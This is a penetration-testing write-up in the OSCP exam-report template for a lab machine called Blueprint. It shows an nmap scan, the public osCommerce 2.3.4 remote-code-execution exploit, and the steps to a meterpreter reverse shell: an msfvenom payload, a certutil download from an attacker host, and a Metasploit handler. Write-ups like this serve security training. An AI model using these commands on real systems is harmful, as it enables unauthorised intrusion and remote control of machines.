---
Topics:
  - "[[01 - Pentesting]]"
  - "[[01 - Red Team]]"
Types:
  - "[[02 - Write Ups]]"
tags:
  - writeup
date created: Tuesday, July 23rd 2024
date modified: Tuesday, July 23rd 2024
---

# 1 OffSec Certified Professional Exam Report - Rafael Pimentel OSID-XXX

1. [[#1 OffSec Certified Professional Exam Report - Rafael Pimentel OSID-XXX|1 OffSec Certified Professional Exam Report - Rafael Pimentel OSID-XXX]]
	1. [[#1 OffSec Certified Professional Exam Report - Rafael Pimentel OSID-XXX#1.1 Introduction|1.1 Introduction]]
	1. [[#1 OffSec Certified Professional Exam Report - Rafael Pimentel OSID-XXX#1.2 Objective|1.2 Objective]]
	1. [[#1 OffSec Certified Professional Exam Report - Rafael Pimentel OSID-XXX#1.3 Requirements|1.3 Requirements]]
1. [[#2 High-Level Summary|2 High-Level Summary]]
	1. [[#2 High-Level Summary#2.1 Recommendations|2.1 Recommendations]]
1. [[#3 Methodologies|3 Methodologies]]
	1. [[#3 Methodologies#3.1 Information Gathering|3.1 Information Gathering]]
	1. [[#3 Methodologies#3.2 Service Enumeration|3.2 Service Enumeration]]
	1. [[#3 Methodologies#3.3 Penetration|3.3 Penetration]]
	1. [[#3 Methodologies#3.4 Maintaining Access|3.4 Maintaining Access]]
	1. [[#3 Methodologies#3.5 House Cleaning|3.5 House Cleaning]]
	1. [[#3 Methodologies#4 Independent Challenges|4 Independent Challenges]]
		1. [[#4 Independent Challenges#4.1 Target 1–10.10.15.198 Blueprint|4.1 Target 1–10.10.15.198 Blueprint]]
			1. [[#4.1 Target 1–10.10.15.198 Blueprint#4.1.1 Initial Access–Oscommerce-2.3.4 Public Exploit|4.1.1 Initial Access–Oscommerce-2.3.4 Public Exploit]]
			1. [[#4.1 Target 1–10.10.15.198 Blueprint#4.1.2 Service Enumeration|4.1.2 Service Enumeration]]
			1. [[#4.1 Target 1–10.10.15.198 Blueprint#4.1.3 Initial Access Walkthrough–Oscommerce-2.3.4 Public Exploit|4.1.3 Initial Access Walkthrough–Oscommerce-2.3.4 Public Exploit]]
			1. [[#4.1 Target 1–10.10.15.198 Blueprint#4.1.4 Privilege Escalation Walkthrough - Reverse Shell|4.1.4 Privilege Escalation Walkthrough - Reverse Shell]]
			1. [[#4.1 Target 1–10.10.15.198 Blueprint#4.1.5 Post Exploitation|4.1.5 Post Exploitation]]

## 1.1 Introduction

The OffSec Certified Professional exam report contains all efforts that were conducted in order to pass the OffSec Certified Professional exam. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.

## 1.2 Objective

The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.

## 1.3 Requirements

The student will be required to fill out this penetration testing report fully and to include the following sections:

·       Overall High-Level Summary and Recommendations (non-technical)

·       Methodology walkthrough and detailed outline of steps taken

·       Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.

·       Any additional items that were not included

# 2 High-Level Summary

John Doe was tasked with performing an internal penetration test towards OffSec Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate OffSec’s internal lab systems–the THINC.local domain. John’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to OffSec.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on OffSec’s network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, John had administrative level access to multiple systems. All systems were successfully exploited and access granted.

## 2.1 Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# 3 Methodologies

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the OffSec Labs and Exam environments are secure. Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## 3.1 Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, John was tasked with exploiting the lab and exam network. The specific IP addresses were:

**Exam Network:**

10.10.15.198 - Blueprint

## 3.2 Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed.

## 3.3 Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, John was able to successfully gain access to 10 out of the 50 systems.

## 3.4 Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## 3.5 House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on both the lab network and exam network were completed, John removed all user accounts and passwords as well as the Meterpreter services installed on the system. OffSec should not have to remove any user accounts or services from the system.

## 4 Independent Challenges

### 4.1 Target 1–10.10.15.198 Blueprint

#### 4.1.1 Initial Access–Oscommerce-2.3.4 Public Exploit

**Vulnerability Explanation:** *Vulnerable version of "Oscommerce" (2.3.4) exploited*.

According to [osCommerce 2.3.4.1 - RCE](https://www.exploit-db.com/exploits/44374):If an admin hasn't deleted the /install/ directory after setting up osCommerce, it leaves a security gap that an attacker could exploit to reinstall the site. The osCommerce installation process doesn't verify if the site is already installed or require any authentication. This means an attacker can run the "install_4.php" script, generating a new config file. They can then inject PHP code into this file and execute it by simply opening it.

**Vulnerability Fix:** Update to latest version of osCommerce (version 4). [Download osCommerce 4](https://www.oscommerce.com/download-oscommerce). Run this program as a low privileged user if possible.

**Severity:** **Critical**

**Steps to reproduce the attack:** Download the osCommerce exploit from exploitdb to your Kali machine.

Modify each request by appending the `verify=False` flag on lines 40, 46, and 65; to ensure that the script will ignore the self-signed certificate.

![[Pasted image 20240719000802.png]]

Execute the script pointing it to the catalog URL.

```bash
python exploit.py https://10.10.101.36/oscommerce-2.3.4/catalog
```

A pseudo-shell connects back to your machine under the `nt/authority` user context.

![[Pasted image 20240719000904.png]]

#### 4.1.2 Service Enumeration

**Port Scan Results:**

```bash
sudo nmap 10.10.15.198 -A -p- -sC -sV -Pn -oN 10.10.15.198_nmap
```

```less
Nmap scan report for 10.10.15.198
Host is up (0.26s latency).
Not shown: 57435 closed tcp ports (reset), 8087 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-title: Index of /
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

#### 4.1.3 Initial Access Walkthrough–Oscommerce-2.3.4 Public Exploit

Found a program called osCommerce (version 2.3.4) running on the webserver's root directory on port 443.

![[Pasted image 20240718234353.png]]

A quick google search revealed that this is a vulnerable program.

I downloaded a [public osCommerce exploit](https://www.exploit-db.com/exploits/44374) from exploitdb to my Kali machine.

Attempting to run the exploit throws a certificate error, I proceeded to edit the script to ignore the certificate.

![[Pasted image 20240718235235.png]]

To achieve this, I modified exploit HTTP requests to ignore certificates following [this guide](https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests). (lines 40, 46, 65).

![[Pasted image 20240719000802.png]]

Executing the exploit grants me a privileged shell (as `nt Authority\SYSTEM` user).

![[Pasted image 20240719000904.png]]

Ran `tasklist` to view running tasks, no Antivirus software was found.

![[Pasted image 20240719002155.png]]

Ran `systeminfo` to determine correct architecture.

![[Pasted image 20240719002429.png]]

#### 4.1.4 Privilege Escalation Walkthrough - Reverse Shell

At this point you need to get a full reverse shell.

On the attacker machine: Generate a meterpreter binary.

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o 443.exe
```

From the pseudo-shell: Transfer the meterpreter binary using `certutil`.

```powershell
certutil -urlcache -f http://10.9.4.112:80/bin/x64/443.exe C:\Windows\Tasks\443.exe
```

On the Kali machine: Start a metasploit listener and execute the meterpreter binary on the target machine.

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; run"
```

![[Pasted image 20240719003641.png]]

From the pseudo-shell: Execute the binary.

```bash
C:\Windows\Tasks\443.exe
```

Check the metasploit listener, a privileged metasploit session starts:

![[Pasted image 20240719004051.png]]

#### 4.1.5 Post Exploitation

**Proof.txt**:

```powershell
whoami && ipconfig && type proof.txt
```

![[Pasted image 20240719013351.png]]
